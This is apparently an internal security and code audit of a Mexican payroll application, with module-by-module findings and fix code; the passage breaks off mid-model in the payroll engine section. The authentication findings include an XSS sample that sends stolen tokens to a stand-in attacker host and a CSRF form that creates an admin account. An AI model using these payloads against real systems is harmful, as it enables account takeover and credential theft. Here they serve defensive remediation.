# IRIS Talent - Comprehensive System Audit Report (Complete Edition)

**Date**: January 2, 2026
**Auditor**: Senior Software Engineering Team
**System**: IRIS Payroll Management System
**Tech Stack**: Go (Gin) + Next.js 14 + TypeScript + SQLite
**Modules Audited**: 25 Business Modules
**Total Lines Analyzed**: ~30,000+ LOC

---

# TABLE OF CONTENTS

1. [Executive Summary](#executive-summary)
2. [System Architecture Overview](#system-architecture-overview)
3. [Module-by-Module Audit](#module-by-module-audit)
   - [Module 1: Authentication & Authorization](#module-1-authentication--authorization)
   - [Module 2: Employee Management](#module-2-employee-management)
   - [Module 3: Payroll Calculation Engine](#module-3-payroll-calculation-engine)
   - [Module 4: Prenomina (Pre-Payroll)](#module-4-prenomina-pre-payroll)
   - [Module 5: Payroll Periods](#module-5-payroll-periods)
   - [Module 6: Incidence Management](#module-6-incidence-management)
   - [Module 7: Absence Request Workflow](#module-7-absence-request-workflow)
   - [Module 8: CFDI Generation](#module-8-cfdi-generation)
   - [Module 9: Report Generation](#module-9-report-generation)
   - [Module 10: Notifications](#module-10-notifications)
   - [Module 11: Announcements](#module-11-announcements)
   - [Module 12: Messaging/Inbox](#module-12-messaginginbox)
   - [Module 13: HR Calendar](#module-13-hr-calendar)
   - [Module 14: Shift Management](#module-14-shift-management)
   - [Module 15: Audit Logging](#module-15-audit-logging)
   - [Module 16: Permission Matrix](#module-16-permission-matrix)
   - [Module 17: Role Inheritance](#module-17-role-inheritance)
   - [Module 18: Configuration Management](#module-18-configuration-management)
   - [Module 19: Catalog Management](#module-19-catalog-management)
   - [Module 20: User Management (Admin)](#module-20-user-management-admin)
   - [Module 21: File Upload](#module-21-file-upload)
   - [Module 22: Employer Contributions](#module-22-employer-contributions)
   - [Module 23: Incidence Type Mapping](#module-23-incidence-type-mapping)
   - [Module 24: Escalation System](#module-24-escalation-system)
   - [Module 25: Health Check](#module-25-health-check)
4. [Cross-Module Assessments](#cross-module-assessments)
   - [Security Assessment](#security-assessment)
   - [Performance Assessment](#performance-assessment)
   - [Testing Assessment](#testing-assessment)
   - [Documentation Assessment](#documentation-assessment)
5. [Complete Sprint Plan](#complete-sprint-plan)
6. [Appendices](#appendices)

---

# EXECUTIVE SUMMARY

## Overall System Status: PRODUCTION READY WITH REQUIRED IMPROVEMENTS

### Global Metrics

| Metric | Current Score | Target Score | Gap |
|--------|--------------|--------------|-----|
| **Code Quality** | 7.5/10 | 8.5/10 | -1.0 |
| **Security** | 7.0/10 | 9.0/10 | -2.0 |
| **Performance** | 7.0/10 | 8.0/10 | -1.0 |
| **Test Coverage** | 0% | 70% | -70% |
| **Documentation** | 6.0/10 | 8.0/10 | -2.0 |
| **Mexican Compliance** | 9.0/10 | 9.0/10 | 0 |
| **Maintainability** | 7.0/10 | 8.0/10 | -1.0 |

### System Inventory

| Component | Count | Status |
|-----------|-------|--------|
| Backend REST API Endpoints | 80+ | Functional |
| Frontend Admin Pages | 35+ | Functional |
| Employee Portal Pages | 11+ | Functional |
| Database Models | 33 | Functional |
| Business Modules | 25 | Functional |
| Configuration Files | 10+ | Functional |
| Service Layer Files | 28 | Functional |
| Handler Files | 23 | Functional |
| Repository Files | 10 | Functional |

### Critical Strengths

1. **Complete Mexican Payroll System**: Full ISR, IMSS, INFONAVIT, CFDI 4.0, Nomina 1.2
2. **Clean Backend Architecture**: Handler -> Service -> Repository pattern
3. **Multi-Stage Approval Workflows**: Supervisor -> Manager -> HR with auto-escalation
4. **12 Role-Based Access Control**: Granular permissions per role
5. **Dual Employee Types**: White collar (monthly), Blue/Gray collar (biweekly/weekly)
6. **Production Docker Deployment**: With Prometheus, Grafana, Loki monitoring

### Critical Weaknesses

1. **localStorage Token Storage**: XSS vulnerability (CVSS 8.1)
2. **No CSRF Protection**: Cross-site request forgery risk
3. **Giant Frontend Components**: 1453-line components need refactoring
4. **Zero Test Coverage**: No unit, integration, or E2E tests
5. **Missing API Documentation**: No OpenAPI/Swagger specification
6. **String Error Comparison**: Anti-pattern in Go backend

### Immediate Action Items (P0 - Must Fix Before Production)

| ID | Issue | Severity | Effort | Module |
|----|-------|----------|--------|--------|
| P0-1 | Move auth tokens to httpOnly cookies | CRITICAL | 8h | Auth |
| P0-2 | Implement CSRF protection | CRITICAL | 6h | Security |
| P0-3 | Refactor 1453-line component | HIGH | 16h | Incidences |
| P0-4 | Add Content Security Policy | HIGH | 2h | Security |
| P0-5 | Enforce strong JWT secrets | MEDIUM | 2h | Auth |

**Total P0 Effort**: 34 hours (1 week)

---

# SYSTEM ARCHITECTURE OVERVIEW

## Technology Stack

### Backend
- **Language**: Go 1.24
- **Framework**: Gin (HTTP router)
- **ORM**: GORM
- **Database**: SQLite
- **Auth**: JWT (golang-jwt)
- **Password**: bcrypt
- **Logging**: Logrus

### Frontend Admin Portal
- **Framework**: Next.js 14 (App Router)
- **Language**: TypeScript
- **Styling**: Tailwind CSS 4
- **UI Components**: Radix UI
- **Forms**: React Hook Form
- **Validation**: Zod
- **Charts**: Recharts

### Employee Portal
- **Framework**: Next.js 14 (App Router)
- **Language**: TypeScript
- **Styling**: Tailwind CSS 4
- **UI Components**: Radix UI

### Infrastructure
- **Containerization**: Docker
- **Orchestration**: Docker Compose
- **Reverse Proxy**: Nginx Alpine
- **Monitoring**: Prometheus, Grafana, Loki

## Directory Structure

```
/home/iamx/IRIS/
├── backend/                          # Go Backend API
│   ├── cmd/
│   │   └── api/main.go              # Entry point
│   ├── internal/
│   │   ├── api/                     # 23 HTTP handlers
│   │   ├── services/                # 28 business logic services
│   │   ├── repositories/            # 10 data access repositories
│   │   ├── models/                  # 22 GORM models
│   │   ├── middleware/              # Auth, CORS, logging
│   │   ├── database/                # DB connection & migrations
│   │   ├── config/                  # Configuration loaders
│   │   ├── dtos/                    # Data transfer objects
│   │   ├── logger/                  # Logging setup
│   │   └── utils/                   # JWT, helpers
│   └── configs/                     # JSON configuration files
│       ├── payroll/                 # Payroll config (UMA, rates)
│       ├── tables/                  # Tax tables (ISR, subsidy)
│       └── holidays/                # Holiday calendars
│
├── frontend/                         # Admin Portal (Next.js)
│   ├── app/                         # Next.js App Router pages
│   ├── components/                  # React components
│   └── lib/                         # API client, utilities
│
├── employee-portal/                 # Employee Portal (Next.js)
│   ├── app/                         # Next.js App Router pages
│   ├── components/                  # React components
│   └── lib/                         # API client, utilities
│
├── docker-compose.yml               # Multi-container orchestration
└── nginx/                           # Nginx configuration
```

---

# MODULE-BY-MODULE AUDIT

---

## MODULE 1: AUTHENTICATION & AUTHORIZATION

### Module Information

| Property | Value |
|----------|-------|
| **Status** | FUNCTIONAL |
| **Priority** | CRITICAL |
| **Risk Level** | HIGH |
| **Score** | 7/10 |

### Files Involved

| File | Purpose | Lines |
|------|---------|-------|
| `backend/internal/api/auth_handler.go` | HTTP handlers for auth endpoints | ~300 |
| `backend/internal/services/auth_service.go` | Business logic for authentication | ~250 |
| `backend/internal/middleware/auth.go` | JWT validation middleware | ~150 |
| `backend/internal/utils/jwt.go` | JWT token generation/validation | ~100 |
| `frontend/lib/api-client.ts` | Frontend API client with auth | ~400 |

### API Endpoints

| Method | Endpoint | Purpose | Auth Required |
|--------|----------|---------|---------------|
| POST | `/api/v1/auth/login` | User login | No |
| POST | `/api/v1/auth/logout` | User logout | Yes |
| POST | `/api/v1/auth/refresh` | Refresh access token | No (refresh token) |
| POST | `/api/v1/auth/register` | Company + admin registration | No |
| GET | `/api/v1/auth/profile` | Get current user profile | Yes |
| PUT | `/api/v1/auth/profile` | Update user profile | Yes |
| POST | `/api/v1/auth/change-password` | Change password | Yes |
| POST | `/api/v1/auth/forgot-password` | Request password reset | No |
| POST | `/api/v1/auth/reset-password` | Reset password with token | No |

### Supported Roles

| Role | Description | Access Level |
|------|-------------|--------------|
| `admin` | Full system administrator | All modules, all actions |
| `hr` | Human Resources manager | Employees, absences, incidences |
| `hr_and_pr` | HR + Payroll combined | HR + payroll processing |
| `hr_blue_gray` | HR for blue/gray collar | Limited to blue/gray employees |
| `hr_white` | HR for white collar | Limited to white collar employees |
| `manager` | General manager | Approvals, team oversight |
| `supervisor` | Direct supervisor | Team approvals, basic oversight |
| `sup_and_gm` | Supervisor + GM combined | Skip approval stages |
| `accountant` | Financial role | Reports, payroll viewing |
| `payroll_staff` | Payroll operations | Payroll processing |
| `employee` | Basic employee | Self-service, own data |
| `viewer` | Read-only access | View only, no modifications |

### What Works

1. **JWT Dual-Token System**
   - Access token (24h expiry)
   - Refresh token (7 day expiry)
   - Automatic token refresh flow

2. **Password Security**
   - bcrypt hashing (cost factor 10)
   - Password change functionality
   - Password reset with email token

3. **Role-Based Access Control**
   - Middleware enforces role requirements
   - User context extracted from JWT
   - Permission checking per endpoint

4. **Session Management**
   - Login audit logging
   - Last login tracking
   - Account deactivation support

### Issues Found

#### ISSUE AUTH-1: localStorage Token Storage (CRITICAL)

**Severity**: CRITICAL
**CVSS Score**: 8.1 (High)
**Location**: `frontend/lib/api-client.ts:204-223`

**Problem Description**:
JWT tokens are stored in browser localStorage, which is accessible to any JavaScript running on the page. If an attacker can inject malicious JavaScript (XSS), they can steal the authentication tokens.

**Vulnerable Code**:
```typescript
// frontend/lib/api-client.ts:204-223
export const setAuthToken = (token: string) => {
  authToken = token
  if (typeof window !== 'undefined') {
    localStorage.setItem('auth_token', token)  // VULNERABLE
  }
}

export const getAuthToken = () => {
  if (!authToken && typeof window !== 'undefined') {
    authToken = localStorage.getItem('auth_token')  // VULNERABLE
  }
  return authToken
}
```

**Attack Vector**:
```javascript
// Attacker injects this script via XSS:
<script>
  const token = localStorage.getItem('auth_token');
  const refreshToken = localStorage.getItem('refresh_token');

  // Send to attacker's server
  fetch('https://evil-attacker.com/steal', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token, refreshToken })
  });
</script>
```

**Impact**:
- Full account takeover
- Session hijacking
- Impersonation of any user
- Access to all user's data

**Required Fix**:

**Step 1: Modify Backend Login Handler**
```go
// backend/internal/api/auth_handler.go

func (h *AuthHandler) Login(c *gin.Context) {
    var req LoginRequest
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
        return
    }

    user, err := h.authService.ValidateCredentials(req.Email, req.Password)
    if err != nil {
        c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid credentials"})
        return
    }

    // Generate tokens
    accessToken, _ := h.authService.GenerateAccessToken(user)
    refreshToken, _ := h.authService.GenerateRefreshToken(user)

    // Set httpOnly cookie for access token
    c.SetSameSite(http.SameSiteStrictMode)
    c.SetCookie(
        "access_token",          // name
        accessToken,             // value
        3600*24,                 // maxAge: 24 hours
        "/",                     // path
        "",                      // domain (empty = same domain)
        true,                    // secure: HTTPS only
        true,                    // httpOnly: NOT accessible to JS
    )

    // Set httpOnly cookie for refresh token
    c.SetCookie(
        "refresh_token",
        refreshToken,
        3600*24*7,              // 7 days
        "/api/v1/auth/refresh", // Only sent to refresh endpoint
        "",
        true,
        true,
    )

    // Return user info (NOT the tokens)
    c.JSON(http.StatusOK, gin.H{
        "message": "Login successful",
        "user": gin.H{
            "id":    user.ID,
            "email": user.Email,
            "role":  user.Role,
            "name":  user.FullName,
        },
    })
}
```

**Step 2: Modify Backend Auth Middleware**
```go
// backend/internal/middleware/auth.go

func AuthMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // Get token from httpOnly cookie (NOT from header)
        tokenString, err := c.Cookie("access_token")
        if err != nil {
            c.JSON(http.StatusUnauthorized, gin.H{"error": "No authentication token"})
            c.Abort()
            return
        }

        // Validate token
        claims, err := utils.ValidateJWT(tokenString)
        if err != nil {
            c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid token"})
            c.Abort()
            return
        }

        // Set user context
        c.Set("userID", claims.UserID)
        c.Set("userEmail", claims.Email)
        c.Set("userRole", claims.Role)
        c.Next()
    }
}
```

**Step 3: Modify Frontend API Client**
```typescript
// frontend/lib/api-client.ts

// Remove all localStorage token handling
// export const setAuthToken = ... // DELETE
// export const getAuthToken = ... // DELETE

async function apiRequest<T>(
  endpoint: string,
  options: RequestInit = {}
): Promise<T> {
  const response = await fetch(`${API_BASE_URL}${endpoint}`, {
    ...options,
    credentials: 'include',  // IMPORTANT: Send cookies with request
    headers: {
      'Content-Type': 'application/json',
      ...options.headers,
    },
  });

  if (!response.ok) {
    if (response.status === 401) {
      // Try to refresh token
      const refreshed = await tryRefreshToken();
      if (refreshed) {
        // Retry original request
        return apiRequest(endpoint, options);
      }
      // Redirect to login
      window.location.href = '/auth/login';
    }
    throw new Error(`API error: ${response.status}`);
  }

  return response.json();
}

async function tryRefreshToken(): Promise<boolean> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/v1/auth/refresh`, {
      method: 'POST',
      credentials: 'include',  // Send refresh cookie
    });
    return response.ok;
  } catch {
    return false;
  }
}
```

**Step 4: Update Backend CORS Configuration**
```go
// backend/internal/api/router.go

func setupCORS() gin.HandlerFunc {
    return cors.New(cors.Config{
        AllowOrigins:     []string{"http://localhost:3000", "https://your-domain.com"},
        AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
        AllowHeaders:     []string{"Content-Type", "Authorization"},
        AllowCredentials: true,  // IMPORTANT: Allow cookies
        MaxAge:           12 * time.Hour,
    })
}
```

**Effort**: 8 hours
**Priority**: P0 (CRITICAL - Must fix before production)

---

#### ISSUE AUTH-2: No CSRF Protection (HIGH)

**Severity**: HIGH
**CVSS Score**: 6.5 (Medium)
**Location**: Backend API (missing middleware)

**Problem Description**:
State-changing requests (POST, PUT, DELETE) do not require CSRF tokens. An attacker can trick an authenticated user into submitting unwanted requests.

**Attack Scenario**:
```html
<!-- On attacker's website: https://evil-site.com -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://iris-app.com/api/v1/employees" method="POST">
    <input name="first_name" value="HACKED" />
    <input name="last_name" value="ACCOUNT" />
    <input name="email" value="attacker@evil.com" />
    <input name="role" value="admin" />
  </form>
</body>
</html>
```

If a logged-in admin visits this page, their browser automatically sends their auth cookies, creating a new admin user for the attacker.

**Required Fix**:

**Step 1: Install CSRF Package**
```bash
go get github.com/gorilla/csrf
```

**Step 2: Create CSRF Middleware**
```go
// backend/internal/middleware/csrf.go
package middleware

import (
    "github.com/gin-gonic/gin"
    "github.com/gorilla/csrf"
    "net/http"
)

var csrfKey = []byte("32-byte-long-auth-key-here-12345") // Use env variable

func CSRFMiddleware() gin.HandlerFunc {
    csrfHandler := csrf.Protect(
        csrfKey,
        csrf.Secure(true),                      // HTTPS only
        csrf.HttpOnly(true),                    // Cookie not accessible to JS
        csrf.SameSite(csrf.SameSiteStrictMode), // Strict same-site policy
        csrf.Path("/"),
        csrf.ErrorHandler(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            w.WriteHeader(http.StatusForbidden)
            w.Write([]byte(`{"error": "CSRF token invalid"}`))
        })),
    )

    return func(c *gin.Context) {
        // Skip CSRF for safe methods
        if c.Request.Method == "GET" || c.Request.Method == "HEAD" || c.Request.Method == "OPTIONS" {
            c.Next()
            return
        }

        // Wrap Gin handler with CSRF protection
        csrfHandler(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            c.Next()
        })).ServeHTTP(c.Writer, c.Request)
    }
}

// GetCSRFToken returns token for frontend
func GetCSRFToken(c *gin.Context) string {
    return csrf.Token(c.Request)
}
```

**Step 3: Add CSRF Token Endpoint**
```go
// backend/internal/api/auth_handler.go

func (h *AuthHandler) GetCSRFToken(c *gin.Context) {
    token := middleware.GetCSRFToken(c)
    c.JSON(http.StatusOK, gin.H{
        "csrf_token": token,
    })
}
```

**Step 4: Apply Middleware to Router**
```go
// backend/internal/api/router.go

func SetupRouter(db *gorm.DB, config *config.AppConfig) *gin.Engine {
    router := gin.Default()

    // Apply CSRF middleware to all routes
    router.Use(middleware.CSRFMiddleware())

    // ... rest of router setup
}
```

**Step 5: Update Frontend to Include CSRF Token**
```typescript
// frontend/lib/api-client.ts

let csrfToken: string | null = null;

async function getCSRFToken(): Promise<string> {
    if (!csrfToken) {
        const response = await fetch(`${API_BASE_URL}/api/v1/auth/csrf-token`, {
            credentials: 'include',
        });
        const data = await response.json();
        csrfToken = data.csrf_token;
    }
    return csrfToken;
}

async function apiRequest<T>(
    endpoint: string,
    options: RequestInit = {}
): Promise<T> {
    const token = await getCSRFToken();

    const response = await fetch(`${API_BASE_URL}${endpoint}`, {
        ...options,
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': token,  // Include CSRF token
            ...options.headers,
        },
    });

    // ... rest of function
}
```

**Effort**: 6 hours
**Priority**: P0 (CRITICAL)

---

#### ISSUE AUTH-3: Weak JWT Secret Configuration (MEDIUM)

**Severity**: MEDIUM
**Location**: `docker-compose.yml:14-15`

**Problem**:
```yaml
JWT_SECRET=${JWT_SECRET:-your-super-secret-jwt-key-change-in-production}
JWT_REFRESH_SECRET=${JWT_REFRESH_SECRET:-your-super-secret-refresh-key-change-in-production}
```

Default secrets are visible in code. No validation that production uses strong secrets.

**Required Fix**:

```go
// backend/internal/config/security.go

func ValidateJWTSecrets(accessSecret, refreshSecret string) error {
    var errors []string

    // Check length
    if len(accessSecret) < 32 {
        errors = append(errors, "JWT_SECRET must be at least 32 characters")
    }
    if len(refreshSecret) < 32 {
        errors = append(errors, "JWT_REFRESH_SECRET must be at least 32 characters")
    }

    // Check for default values
    defaultSecrets := []string{
        "your-super-secret-jwt-key-change-in-production",
        "your-super-secret-refresh-key-change-in-production",
        "secret",
        "jwt-secret",
        "change-me",
    }

    for _, defaultSecret := range defaultSecrets {
        if accessSecret == defaultSecret {
            errors = append(errors, "JWT_SECRET is using a default value")
        }
        if refreshSecret == defaultSecret {
            errors = append(errors, "JWT_REFRESH_SECRET is using a default value")
        }
    }

    // Check entropy (simple check)
    if !hasGoodEntropy(accessSecret) {
        errors = append(errors, "JWT_SECRET has low entropy")
    }

    if len(errors) > 0 {
        return fmt.Errorf("JWT configuration errors:\n- %s", strings.Join(errors, "\n- "))
    }

    return nil
}

func hasGoodEntropy(s string) bool {
    // Check for variety of character types
    hasUpper := false
    hasLower := false
    hasDigit := false
    hasSpecial := false

    for _, c := range s {
        switch {
        case unicode.IsUpper(c):
            hasUpper = true
        case unicode.IsLower(c):
            hasLower = true
        case unicode.IsDigit(c):
            hasDigit = true
        default:
            hasSpecial = true
        }
    }

    // Require at least 3 of 4 character types
    count := 0
    if hasUpper { count++ }
    if hasLower { count++ }
    if hasDigit { count++ }
    if hasSpecial { count++ }

    return count >= 3
}
```

**Effort**: 2 hours
**Priority**: P1

---

### Module Score Summary

| Metric | Score | Notes |
|--------|-------|-------|
| Functionality | 9/10 | Complete auth features |
| Security | 5/10 | Critical localStorage issue |
| Code Quality | 7/10 | Clean structure |
| Performance | 8/10 | JWT is fast |
| Maintainability | 7/10 | Well-organized |
| **OVERALL** | **7/10** | Needs security fixes |

---

## MODULE 2: EMPLOYEE MANAGEMENT

### Module Information

| Property | Value |
|----------|-------|
| **Status** | FUNCTIONAL |
| **Priority** | HIGH |
| **Risk Level** | MEDIUM |
| **Score** | 8/10 |

### Files Involved

| File | Purpose | Lines |
|------|---------|-------|
| `backend/internal/api/employee_handler.go` | HTTP handlers | ~400 |
| `backend/internal/services/employee_service.go` | Business logic | ~350 |
| `backend/internal/repositories/employee_repository.go` | Data access | ~200 |
| `backend/internal/models/employee.go` | Data model | ~150 |
| `frontend/app/employees/page.tsx` | Employee list UI | ~600 |

### API Endpoints

| Method | Endpoint | Purpose |
|--------|----------|---------|
| GET | `/api/v1/employees` | List all employees (with filters) |
| GET | `/api/v1/employees/:id` | Get employee details |
| POST | `/api/v1/employees` | Create new employee |
| PUT | `/api/v1/employees/:id` | Update employee |
| DELETE | `/api/v1/employees/:id` | Soft delete employee |
| POST | `/api/v1/employees/:id/terminate` | Terminate with reason |
| GET | `/api/v1/employees/:id/vacation-balance` | Get vacation balance |
| GET | `/api/v1/employees/:id/absence-summary` | Get absence statistics |
| POST | `/api/v1/employees/:id/create-portal-user` | Create employee portal account |

### Data Model

```go
type Employee struct {
    // Primary Key
    ID                uuid.UUID `gorm:"type:text;primary_key" json:"id"`
    CompanyID         uuid.UUID `gorm:"type:text;not null" json:"company_id"`

    // Basic Information
    EmployeeNumber    string    `gorm:"type:varchar(50);unique;not null" json:"employee_number"`
    FirstName         string    `gorm:"type:varchar(100);not null" json:"first_name"`
    LastName          string    `gorm:"type:varchar(100);not null" json:"last_name"`
    MotherLastName    string    `gorm:"type:varchar(100)" json:"mother_last_name"`
    DateOfBirth       time.Time `gorm:"type:date" json:"date_of_birth"`
    Gender            string    `gorm:"type:varchar(10)" json:"gender"`

    // Mexican Identifiers (CRITICAL for payroll)
    RFC               string    `gorm:"type:varchar(13);unique" json:"rfc"`
    CURP              string    `gorm:"type:varchar(18);unique" json:"curp"`
    NSS               string    `gorm:"type:varchar(11)" json:"nss"`

    // Employment Information
    HireDate          time.Time `gorm:"type:date;not null" json:"hire_date"`
    TerminationDate   *time.Time `gorm:"type:date" json:"termination_date,omitempty"`
    TerminationReason string    `gorm:"type:text" json:"termination_reason,omitempty"`
    DailySalary       float64   `gorm:"type:decimal(15,2);not null" json:"daily_salary"`
    CollarType        string    `gorm:"type:varchar(20)" json:"collar_type"` // white, blue, gray
    EmploymentType    string    `gorm:"type:varchar(50)" json:"employment_type"`
    EmploymentStatus  string    `gorm:"type:varchar(20);default:'active'" json:"employment_status"`

    // Contact Information
    Email             string    `gorm:"type:varchar(255)" json:"email,omitempty"`
    PersonalEmail     string    `gorm:"type:varchar(255)" json:"personal_email,omitempty"`
    CellPhone         string    `gorm:"type:varchar(20)" json:"cell_phone,omitempty"`

    // Emergency Contact
    EmergencyContact  string    `gorm:"type:varchar(200)" json:"emergency_contact,omitempty"`
    EmergencyPhone    string    `gorm:"type:varchar(20)" json:"emergency_phone,omitempty"`

    // Organizational
    CostCenterID      *uuid.UUID `gorm:"type:text" json:"cost_center_id,omitempty"`
    SupervisorID      *uuid.UUID `gorm:"type:text" json:"supervisor_id,omitempty"`
    ManagerID         *uuid.UUID `gorm:"type:text" json:"manager_id,omitempty"`
    Department        string    `gorm:"type:varchar(100)" json:"department,omitempty"`
    Position          string    `gorm:"type:varchar(100)" json:"position,omitempty"`

    // Timestamps
    CreatedAt         time.Time `json:"created_at"`
    UpdatedAt         time.Time `json:"updated_at"`
    DeletedAt         *time.Time `gorm:"index" json:"deleted_at,omitempty"`

    // Relationships
    CostCenter        *CostCenter `gorm:"foreignKey:CostCenterID" json:"cost_center,omitempty"`
    Supervisor        *Employee   `gorm:"foreignKey:SupervisorID" json:"supervisor,omitempty"`
}
```

### What Works

1. **Full CRUD Operations**
   - Create with all Mexican identifiers
   - Update any field
   - Soft delete (preserves history)
   - Termination with reason tracking

2. **Mexican ID Validation**
   - RFC format validation (13 characters)
   - CURP format validation (18 characters)
   - NSS format validation (11 digits)

3. **Collar Type Classification**
   - White collar: Salaried, monthly pay
   - Blue collar: Unionized, weekly pay
   - Gray collar: Non-unionized, biweekly pay

4. **Salary Management**
   - Current salary tracking
   - Salary history on changes
   - Effective date tracking

5. **Organizational Structure**
   - Cost center assignment
   - Supervisor relationships
   - Manager assignments
   - Department/position

### Issues Found

#### ISSUE EMP-1: No Email Format Validation (MEDIUM)

**Location**: `backend/internal/models/employee.go`

**Problem**: Email field accepts any string without validation.

**Fix**:
```go
// backend/internal/services/employee_service.go

import "regexp"

var emailRegex = regexp.MustCompile(`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`)

func (s *EmployeeService) ValidateEmployee(emp *CreateEmployeeRequest) error {
    var errors []string

    // Validate email
    if emp.Email != "" && !emailRegex.MatchString(emp.Email) {
        errors = append(errors, "Invalid email format")
    }

    // Validate RFC (13 characters: 4 letters + 6 digits + 3 alphanumeric)
    if emp.RFC != "" {
        rfcRegex := regexp.MustCompile(`^[A-Z&Ñ]{3,4}[0-9]{6}[A-Z0-9]{3}$`)
        if !rfcRegex.MatchString(strings.ToUpper(emp.RFC)) {
            errors = append(errors, "Invalid RFC format")
        }
    }

    // Validate CURP (18 characters)
    if emp.CURP != "" {
        curpRegex := regexp.MustCompile(`^[A-Z][AEIOUX][A-Z]{2}[0-9]{6}[HM][A-Z]{5}[0-9A-Z][0-9]$`)
        if !curpRegex.MatchString(strings.ToUpper(emp.CURP)) {
            errors = append(errors, "Invalid CURP format")
        }
    }

    // Validate NSS (11 digits)
    if emp.NSS != "" {
        nssRegex := regexp.MustCompile(`^[0-9]{11}$`)
        if !nssRegex.MatchString(emp.NSS) {
            errors = append(errors, "Invalid NSS format (must be 11 digits)")
        }
    }

    if len(errors) > 0 {
        return fmt.Errorf("validation errors: %s", strings.Join(errors, "; "))
    }

    return nil
}
```

**Effort**: 2 hours
**Priority**: P2

---

#### ISSUE EMP-2: Salary History Not Auto-Created (LOW)

**Location**: `backend/internal/services/employee_service.go`

**Problem**: Creating an employee doesn't automatically create initial salary history entry.

**Fix**:
```go
func (s *EmployeeService) CreateEmployee(req *CreateEmployeeRequest) (*models.Employee, error) {
    // Validate
    if err := s.ValidateEmployee(req); err != nil {
        return nil, err
    }

    // Start transaction
    tx := s.db.Begin()

    // Create employee
    employee := &models.Employee{
        ID:             uuid.New(),
        CompanyID:      req.CompanyID,
        EmployeeNumber: req.EmployeeNumber,
        FirstName:      req.FirstName,
        LastName:       req.LastName,
        // ... other fields
        DailySalary:    req.DailySalary,
    }

    if err := tx.Create(employee).Error; err != nil {
        tx.Rollback()
        return nil, err
    }

    // Create initial salary history
    salaryHistory := &models.SalaryHistory{
        ID:            uuid.New(),
        EmployeeID:    employee.ID,
        PreviousSalary: 0,
        NewSalary:     req.DailySalary,
        EffectiveDate: employee.HireDate,
        Reason:        "Initial hire",
        ChangedBy:     req.CreatedBy,
    }

    if err := tx.Create(salaryHistory).Error; err != nil {
        tx.Rollback()
        return nil, err
    }

    tx.Commit()
    return employee, nil
}
```

**Effort**: 2 hours
**Priority**: P3

---

### Module Score Summary

| Metric | Score | Notes |
|--------|-------|-------|
| Functionality | 9/10 | Complete CRUD |
| Security | 8/10 | Good authorization |
| Code Quality | 8/10 | Clean structure |
| Validation | 7/10 | Needs email validation |
| **OVERALL** | **8/10** | Production ready |

---

## MODULE 3: PAYROLL CALCULATION ENGINE

### Module Information

| Property | Value |
|----------|-------|
| **Status** | FUNCTIONAL - PRODUCTION READY |
| **Priority** | CRITICAL |
| **Risk Level** | HIGH |
| **Score** | 8/10 |

### Files Involved

| File | Purpose | Lines |
|------|---------|-------|
| `backend/internal/services/payroll_service.go` | Main calculation engine | ~800 |
| `backend/internal/services/tax_calculation_service.go` | Tax calculations | ~400 |
| `backend/internal/models/payroll.go` | Payroll data model | ~200 |
| `backend/configs/tables/isr_biweekly_2025.json` | ISR tax tables | ~150 |
| `backend/configs/tables/isr_monthly_2025.json` | ISR tax tables | ~150 |
| `backend/configs/tables/subsidy_2025.json` | Employment subsidy | ~100 |
| `backend/configs/payroll/contribution_rates.json` | IMSS/INFONAVIT rates | ~200 |
| `backend/configs/payroll/official_values.json` | UMA, min wage values | ~50 |

### API Endpoints

| Method | Endpoint | Purpose |
|--------|----------|---------|
| POST | `/api/v1/payroll/calculate/:periodId` | Calculate all employees for period |
| POST | `/api/v1/payroll/calculate/:periodId/employee/:employeeId` | Calculate single employee |
| GET | `/api/v1/payroll/:periodId/calculations` | Get all calculations for period |
| GET | `/api/v1/payroll/:periodId/employee/:employeeId` | Get single calculation |
| POST | `/api/v1/payroll/:periodId/approve` | Approve payroll period |
| GET | `/api/v1/payroll/:periodId/summary` | Get period summary |
| GET | `/api/v1/payroll/:periodId/export` | Export to Excel |
| POST | `/api/v1/payroll/:periodId/generate-cfdis` | Generate CFDI XMLs |
| GET | `/api/v1/payroll/:periodId/employee/:employeeId/payslip` | Download PDF payslip |

### Data Model

```go
type PayrollCalculation struct {
    ID                   uuid.UUID `gorm:"type:text;primary_key" json:"id"`
    EmployeeID           uuid.UUID `gorm:"type:text;not null" json:"employee_id"`
    PayrollPeriodID      uuid.UUID `gorm:"type:text;not null" json:"payroll_period_id"`
    PrenominaMetricID    *uuid.UUID `gorm:"type:text" json:"prenomina_metric_id,omitempty"`

    // Calculation Metadata
    CalculationDate      time.Time `gorm:"type:timestamp" json:"calculation_date"`
    CalculationStatus    string    `gorm:"type:varchar(20)" json:"calculation_status"` // pending, calculated, approved
    PayrollStatus        string    `gorm:"type:varchar(20)" json:"payroll_status"`     // pending, processed, paid

    // === INCOME SECTION ===
    // Regular Pay
    RegularSalary        float64 `gorm:"type:decimal(15,2)" json:"regular_salary"`
    WorkedDays           float64 `gorm:"type:decimal(8,2)" json:"worked_days"`

    // Overtime
    OvertimeHours        float64 `gorm:"type:decimal(8,2)" json:"overtime_hours"`
    OvertimeAmount       float64 `gorm:"type:decimal(15,2)" json:"overtime_amount"`
    DoubleOvertimeHours  float64 `gorm:"type:decimal(8,2)" json:"double_overtime_hours"`
    DoubleOvertimeAmount float64 `gorm:"type:decimal(15,2)" json:"double_overtime_amount"`
    TripleOvertimeHours  float64 `gorm:"type:decimal(8,2)" json:"triple_overtime_hours"`
    TripleOvertimeAmount float64 `gorm:"type:decimal(15,2)" json:"triple_overtime_amount"`

    // Special Payments
    VacationPremium      float64 `gorm:"type:decimal(15,2)" json:"vacation_premium"`
    VacationDays         float64 `gorm:"type:decimal(8,2)" json:"vacation_days"`
    Aguinaldo            float64 `gorm:"type:decimal(15,2)" json:"aguinaldo"`
    BonusAmount          float64 `gorm:"type:decimal(15,2)" json:"bonus_amount"`
